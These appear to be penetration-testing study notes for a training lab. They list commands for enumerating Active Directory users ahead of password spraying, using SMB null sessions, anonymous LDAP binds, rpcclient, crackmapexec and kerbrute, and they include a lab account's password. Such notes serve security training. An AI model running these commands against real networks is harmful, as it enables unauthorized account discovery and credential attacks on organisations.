# Password Spraying

Detailed User Enumeration

To mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with. There are several ways that we can gather a target list of valid users:

* By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
* Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
* Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as [linkedin2username ](https://github.com/initstring/linkedin2username)to create a list of potentially valid users
* Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist

## Get Users list

### using enum4linux

```bash
enum4linux -U $IP  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

### using rpcclient

```bash
rpcclient -U "" -N $IP
```

* `enumdomusers`

```bash
crackmapexec smb $IP --users
```

### Using ldapsearch


```bash
ldapsearch -h $IP -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```


```bash
./windapsearch.py --dc-ip $IP -u "" -U
```

### **Enumerating Users with Kerbrute**


```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc $IP ~/Desktop/jsmith.txt -o valid_ad_users
```


## Using CrackMapExec with Valid Credentials

```bash
sudo crackmapexec smb $IP -u htb-student -p Academy_student_AD! --users
```
